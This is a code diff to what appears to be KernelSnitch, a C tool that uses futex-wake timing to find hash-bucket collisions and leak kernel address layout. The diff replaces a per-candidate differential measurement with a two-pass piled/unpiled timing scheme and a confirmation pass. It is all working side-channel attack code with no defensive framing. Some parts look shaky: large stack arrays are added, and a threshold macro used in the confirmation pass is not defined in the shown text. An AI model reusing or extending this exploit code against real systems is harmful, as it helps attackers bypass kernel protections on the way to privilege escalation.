@@ -28,6 +28,9 @@
 #define KS_PAGE_SIZE PAGE_SIZE
 #endif
 #define APPENDED_FUTEXES 4096
+#ifndef KERNELSNITCH_MAX_CAND
+#define KERNELSNITCH_MAX_CAND 65536
+#endif
 #define MULITPLE 4
 #if defined(__INTEL) || defined(__AMD)
 #define IDENTITY_START 0xffff888000000000ULL
@@ -182,7 +185,7 @@ static int __compare(const void *a, const void *b)
  */
 static volatile char __ks_flush_buf[(1 << 10) * (1 << 7)]; /* 128KB, upstream */
 
-static size_t __measure(size_t futex_addr)
+static size_t __measure_raw(size_t futex_addr)
 {
     size_t t0;
     size_t t1;
@@ -382,51 +385,6 @@ static void __decrease(struct kernelsnitch_shared_state *ks, size_t id)
     usleep(20000); /* let the woken threads actually exit */
 }
 
-static size_t __measure_diff(struct kernelsnitch_shared_state *ks, size_t id,
-                              size_t futex_addr)
-{
-    /* v9 differential: same measurement core as __measure (flush+cntvct)
-       taken twice - with the bucket piled and after unpiling. */
-    size_t t_piled = 0, t_empty = 0;
-    size_t __times[REPEAT_MEASUREMENT];
-    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
-        sched_yield();
-        memset((char *)__ks_flush_buf, 1, sizeof(__ks_flush_buf));
-        for (volatile size_t *p = (volatile size_t *)__ks_flush_buf;
-             p < (volatile size_t *)(__ks_flush_buf + sizeof(__ks_flush_buf));
-             p += 64 / sizeof(size_t))
-            (void)*p;
-        size_t t0 = now_ns();
-        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
-        size_t t1 = now_ns();
-        __times[l] = t1 - t0;
-    }
-    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
-    for (size_t l = 0; l < AVERAGE; ++l)
-        t_piled += __times[l];
-    t_piled /= AVERAGE;
-
-    __decrease(ks, id);
-
-    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
-        sched_yield();
-        memset((char *)__ks_flush_buf, 1, sizeof(__ks_flush_buf));
-        for (volatile size_t *p = (volatile size_t *)__ks_flush_buf;
-             p < (volatile size_t *)(__ks_flush_buf + sizeof(__ks_flush_buf));
-             p += 64 / sizeof(size_t))
-            (void)*p;
-        size_t t0 = now_ns();
-        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
-        size_t t1 = now_ns();
-        __times[l] = t1 - t0;
-    }
-    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
-    for (size_t l = 0; l < AVERAGE; ++l)
-        t_empty += __times[l];
-    t_empty /= AVERAGE;
-    return t_piled > 3 * t_empty;
-}
-
 void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
     #define ID 128
@@ -441,7 +399,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
-    size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    size_t approx_time = MIN(__measure_raw((size_t)&ks->futexes[0]), __measure_raw((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -451,20 +409,37 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
 
-    /* CDY: single-pass capture (differential produced inconsistent sets;
-       the offline PC solver works with the original collection). */
-    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
-        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
-        if (id >= FUTEX_SZ)
-            break;
-        futex_addr = (size_t)&ks->futexes[id];
-        /* v9: differential capture (pile/unpile). With fixed timing this
-           cleanly separates real same-bucket addrs from static noise. */
-        ks->times[i] = __measure_diff(ks, ID, futex_addr);
-        if (ks->times[i]) {
-            count++;
-            ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx", futex_addr);
+    /* v10: TWO-PASS differential. Pass A measures every candidate with the
+       target bucket piled (pile persists for the whole pass); then unpile;
+       pass B re-measures. tA > 3*tB + floor => same-bucket. Per-candidate
+       static cost cancels; the pile is not churned per candidate. */
+    {
+        size_t cand_idx[KERNELSNITCH_MAX_CAND];
+        size_t cand_n = 0;
+        size_t times_a[KERNELSNITCH_MAX_CAND];
+        size_t times_b[KERNELSNITCH_MAX_CAND];
+        /* pass A: piled */
+        for (size_t i = 2; i < ks->total_futexes && cand_n < KERNELSNITCH_MAX_CAND; ++i) {
+            id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+            if (id >= FUTEX_SZ)
+                break;
+            cand_idx[cand_n++] = (size_t)&ks->futexes[id];
+        }
+        if (ks->verbose)
+            pr_info("pass A: %zu candidates, bucket piled\n", cand_n);
+        for (size_t i = 0; i < cand_n; ++i)
+            times_a[i] = __measure_raw(cand_idx[i]);
+        __decrease(ks, ID);
+        if (ks->verbose)
+            pr_info("pass B: re-measuring unpiled\n");
+        for (size_t i = 0; i < cand_n; ++i)
+            times_b[i] = __measure_raw(cand_idx[i]);
+        for (size_t i = 0; i < cand_n && count < wanted; ++i) {
+            if (times_a[i] > 3 * times_b[i] + 8) {
+                count++;
+                ks->futex_addrs[count] = cand_idx[i];
+                if (ks->verbose) pr_info("  %016zx  (%zu > 3x%zu)", cand_idx[i], times_a[i], times_b[i]);
+            }
         }
     }
     /* v7: confirmation pass - a real collision is >10x on EVERY
@@ -472,7 +447,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     if (count > 0) {
         size_t kept = 1;
         for (size_t i = 1; i <= count; ++i) {
-            size_t t2 = __measure_diff(ks, ID, ks->futex_addrs[i]);
+            size_t t2 = __measure_raw(ks->futex_addrs[i]) > (approx_time * KERNELSNITCH_THRESHOLD_MULT);
             if (t2)
                 ks->futex_addrs[kept++] = ks->futex_addrs[i];
         }
